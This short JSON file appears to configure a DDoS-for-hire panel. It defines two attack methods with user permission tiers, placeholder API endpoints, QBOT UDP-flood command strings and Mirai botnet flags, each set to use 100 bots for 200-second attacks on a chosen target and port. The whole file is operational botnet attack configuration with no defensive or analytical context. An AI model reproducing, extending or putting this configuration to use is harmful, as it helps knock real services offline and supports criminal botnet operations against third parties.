{
	"Methods": [
		{
			"Name": "DC",
			"Time": 200,
			"API": [
				"https://gg.gg"
			],
			"Permissions": [
				"VIP++"
			],
			"Server": [],
			"QBOT": {
				"Command": "!* UDP [target] [port] [time] 32 1024 1",
				"Bots": 100
			},
			"MIRAI": {
				"PortFlag": 7,
				"MethodFlag": 0,
				"LenFlag": 0,
				"Bots": 100
			}
		},
		{
			"Name": "WRA",
			"Time": 200,
			"API": [
				"https://123.com"
			],
			"Permissions": [
				"USER"
			],
			"Server": [],
			"QBOT": {
				"Command": "!* UDP [target] [port] [time] 32 1024 1",
				"Bots": 100
			},
			"MIRAI": {
				"PortFlag": 7,
				"MethodFlag": 0,
				"LenFlag": 0,
				"Bots": 100
			}
		}
	]
}